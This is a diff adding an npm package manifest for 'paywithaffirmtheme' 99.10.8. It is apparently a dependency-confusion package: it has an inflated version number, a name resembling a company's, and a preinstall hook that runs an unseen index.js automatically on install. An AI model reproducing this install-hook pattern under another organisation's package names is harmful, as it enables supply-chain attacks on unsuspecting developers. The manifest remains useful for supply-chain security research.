@@ -1,0 +1,39 @@
+{
+    "name": "paywithaffirmtheme",
+    "version": "99.10.8",
+    "description": "affirm test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "paywithaffirmtheme@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-4h/CIaPss1qmYUF0tnSFC6qDjHrLF0vvR0oPA7Lc6TMlisbrELpjUpys6AC5zHAzOwrV6UF7VKrvxOTe+FgPdQ==",
+        "shasum": "82feb0cc21695028142fae4580079fd7e8bd5d3d",
+        "tarball": "https://registry.npmjs.org/paywithaffirmtheme/-/paywithaffirmtheme-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3225,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmntCCRA9TVsSAnZWagAAqz0P/1jfVF95OEW7T1cmokXh\n9rCq3QQApYhvfOyFA145ubjJF+oqPt3H3j0j/JfTlWJY7SXCYrWHSXWr9uJ9\n3GM1Br3dM2QsbXGG8Zt5DcQAiYKIFvx2evIDHguBvzpKXRJQ0wWjl5y9nIBN\nuWl3tLxmcy/P+TFxzlIpiYe3icxT3M67ReppwCTMjhJc7baXLpXELkahb3oe\nnpx4y18NkQN3Hhl7Ybt9+dpeTP/UMjr+m2q2/q5+c60gETQQsoPzpqTn8AiG\ncjv0UBrJIoHjjXsOyXxqxAU67fwPROhMBqQk0xRf8i4Ea5Y2GjOJYFrJ3TTi\nk5Pt+aq6cNpILAEOX0wQnyShPYHy6D2Ivy75wmT2cXfa8jcq0177SrlppS6F\nKZuATL8Qd09gMEA+k+ScXb8OF8Zq7giD8JjbDlEs1odtXpPtG3O/+wBuqA5/\nAiVlANA1oCrjOSBPe6z+eUnr0CBFliG6ZZP3YYRjuSW8M1kV8LoAlmlCZr7C\n8TH/SRe0Cz6+Al1QIFzsanION/0Wi9FLCcNT00Xu0v9QdP9ZdLl6rvy78+Ku\nmX1QJJHCTbHjOD3BbUxTtEBBjE0cuUxHP9cDPefQetLhRunkBRfz9S1fwRmk\n/TPzc8/54mkcNZHOc1YlLcrEq8W2A0S33Cbkcuu1Z5igz2qSdmr6G7E9KReM\nAx5x\r\n=Fo4W\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/paywithaffirmtheme_99.10.8_1637514050168_0.416084163152435"
+    },
+    "_hasShrinkwrap": false
+}
